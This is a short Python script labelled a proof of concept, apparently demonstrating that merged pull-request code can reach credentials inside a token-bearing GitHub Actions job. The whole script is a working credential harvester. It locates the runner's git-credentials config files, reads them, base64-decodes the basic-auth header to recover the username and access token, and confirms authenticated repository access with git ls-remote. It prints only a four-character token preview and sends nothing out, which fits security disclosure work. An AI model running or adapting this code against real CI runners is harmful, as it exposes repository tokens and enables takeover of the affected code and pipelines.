import sys, os, glob, base64, subprocess

print("=== [PoC] merged-PR code executing inside token-bearing job ===")
print("argv:", sys.argv[1:])

cands = glob.glob(os.path.expandvars("$RUNNER_TEMP/git-credentials-*.config")) + \
        glob.glob("/home/runner/work/_temp/git-credentials-*.config")
print("[PoC] credential file candidates:", cands)
for c in cands:
    try:
        data = open(c).read()
        print(f"[PoC] READABLE: {c} ({len(data)} bytes)")
        for line in data.splitlines():
            if "basic" in line:
                b64 = line.split("basic")[-1].strip()
                try:
                    dec = base64.b64decode(b64).decode(errors="replace")
                    user, _, tok = dec.partition(":")
                    print(f"[PoC] decoded auth user={user!r} token_preview={tok[:4]}...<redacted len={len(tok)}>")
                except Exception as e:
                    print("[PoC] decode err", e)
    except Exception as e:
        print(f"[PoC] unreadable: {c}: {e}")

try:
    cfg = open(".git/config").read()
    print("[PoC] .git/config readable, has include:", "include" in cfg.lower())
except Exception as e:
    print("[PoC] no .git/config:", e)

try:
    out = subprocess.run(["git", "ls-remote", "origin", "HEAD"], capture_output=True, text=True, timeout=30)
    print("[PoC] git ls-remote origin rc=", out.returncode, "out:", out.stdout.strip()[:80])
except Exception as e:
    print("[PoC] ls-remote err:", e)
